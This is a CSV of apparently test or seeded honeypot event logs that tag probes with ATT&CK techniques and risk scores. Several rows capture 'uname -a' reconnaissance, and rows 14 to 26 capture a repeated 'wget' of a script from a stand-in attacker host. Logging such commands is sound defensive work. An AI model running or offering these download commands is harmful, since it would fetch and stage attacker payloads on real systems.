id,timestamp,received_at,src_ip,dst_port,commands,att_ck_technique,risk_score,playbook_id
2,2026-08-10 20:37:31.278+00,,0.0.0.0,,,T1190,0.00,PB-DIONAEA-v1.0
3,2026-08-10 21:04:59.701+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
4,2026-08-11 03:17:36.846+00,,185.220.101.34,2222,"",T1595,0.00,PB-H1-v1.0
5,2026-08-11 03:17:36.813+00,,185.220.101.34,2222,uname -a,T1059,0.40,PB-H2-v1.0
6,2026-08-11 03:31:39.175+00,,185.220.101.34,2222,"",T1595,0.00,PB-H1-v1.0
7,2026-08-11 03:31:39.228+00,,185.220.101.34,2222,uname -a,T1059,0.40,PB-H2-v1.0
8,2026-08-11 03:40:29.557+00,,185.220.101.34,2222,"",T1595,0.00,PB-H1-v1.0
9,2026-08-11 03:40:29.548+00,,185.220.101.34,2222,uname -a,T1059,0.40,PB-H2-v1.0
10,2026-08-11 03:42:47.462+00,,185.220.101.34,2222,uname -a,T1059,0.40,PB-H2-v1.0
11,2026-08-11 03:42:54.65+00,,185.220.101.34,2222,"",T1595,0.00,PB-H1-v1.0
12,2026-08-11 03:48:35.916+00,,185.220.101.34,2222,uname -a,T1059,0.40,PB-H2-v1.0
13,2026-08-11 03:48:35.823+00,,185.220.101.34,2222,"",T1595,0.00,PB-H1-v1.0
14,2026-08-11 04:12:59.059+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
15,2026-08-11 04:25:00.658+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
16,2026-08-11 04:26:18.794+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
17,2026-08-11 04:29:01.213+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
19,2026-08-11 04:36:57.457+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
21,2026-08-11 04:44:45.584+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
22,2026-08-11 04:44:45.584+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
23,2026-08-11 04:46:04.392+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
24,2026-08-11 04:46:04.392+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
25,2026-08-11 04:52:23.96+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
26,2026-08-11 04:52:23.96+00,,203.0.113.99,2222,wget http://evil.example.com/x.sh,T1059,0.70,PB-H2-v1.0
27,2026-08-11 04:57:51.228+00,,198.51.100.7,2222,"",T1595,0.00,PB-H1-v1.0
28,2026-08-12 02:31:37.133+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
29,2026-08-12 02:31:49.42+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
30,2026-08-12 02:31:50.866+00,,0.0.0.0,,,T1190,0.00,PB-DIONAEA-v1.0
31,2026-08-12 02:45:53.506+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
32,2026-08-12 02:45:55.27+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
33,2026-08-12 02:45:56.288+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
34,2026-08-12 02:45:57.574+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
35,2026-08-12 02:45:59.043+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
36,2026-08-12 02:46:00.071+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
37,2026-08-12 02:46:01.035+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
38,2026-08-12 02:46:01.981+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
39,2026-08-12 02:46:03.553+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
40,2026-08-12 02:50:05.123207+00,,172.20.0.1,2223,"",T1595,0.00,PB-H1-v1.0
41,2026-08-12 02:50:05.64717+00,,172.20.0.1,2223,"",T1595,0.00,PB-H1-v1.0
42,2026-08-12 02:50:05.69595+00,,172.20.0.1,2223,"",T1595,0.00,PB-H1-v1.0
43,2026-08-12 02:50:06.439692+00,,172.20.0.1,2223,"",T1595,0.00,PB-H1-v1.0
44,2026-08-12 02:50:06.444356+00,,172.20.0.1,2223,"",T1595,0.00,PB-H1-v1.0
45,2026-08-12 03:00:00+00,,203.0.113.9,,"",T1595,0.00,PB-H1-v1.0
46,2026-08-12 02:52:44.891+00,,0.0.0.0,,,T1190,0.00,PB-DIONAEA-v1.0
47,2026-08-12 22:38:10.515+00,,0.0.0.0,,,T1190,0.00,PB-DIONAEA-v1.0
48,2026-08-12 22:41:14.793+00,,0.0.0.0,,,T1190,0.00,PB-DIONAEA-v1.0
49,2026-08-12 22:42:55.795859+00,,172.20.0.1,21,,T1190,0.00,PB-DIONAEA-v1.0
50,2026-08-13 01:28:25.081595+00,,172.20.0.1,1433,,T1190,0.00,PB-DIONAEA-v1.0
51,2026-08-13 01:56:27.236111+00,,172.20.0.1,1433,,T1190,0.00,PB-DIONAEA-v1.0
52,2026-08-13 01:57:09.961039+00,,172.20.0.7,38929,,T1190,0.00,PB-DIONAEA-v1.0
53,2026-08-13 01:57:09.398766+00,,172.20.0.1,1433,,T1190,0.00,PB-DIONAEA-v1.0
54,2026-08-13 02:02:53.942958+00,,172.20.0.1,1433,,T1190,0.00,PB-DIONAEA-v1.0
55,2026-08-13 02:02:53.97824+00,,172.20.0.1,21,,T1190,0.00,PB-DIONAEA-v1.0
56,2026-08-14 01:42:36.543977+00,,172.20.0.1,2222,"",T1595,0.00,PB-H1-v1.0
57,2026-08-14 01:42:36.645979+00,,172.20.0.1,2222,"",T1595,0.00,PB-H1-v1.0
58,2026-08-14 01:42:36.716243+00,,172.20.0.1,2222,"",T1595,0.00,PB-H1-v1.0
59,2026-08-14 01:42:37.000995+00,,172.20.0.1,2222,"",T1595,0.00,PB-H1-v1.0
60,2026-08-21 01:20:00+00,,203.0.113.50,2222,uname -a,T1059,0.40,PB-H2-v1.0
61,2026-08-21 01:20:30+00,,192.0.2.30,445,,T1190,0.00,PB-DIONAEA-v1.0
62,2026-08-21 01:20:00+00,,203.0.113.50,2222,uname -a,T1059,0.40,PB-H2-v1.0
63,2026-08-23 05:19:55+00,,203.0.113.66,2222,"",T1595,0.00,PB-H1-v1.0
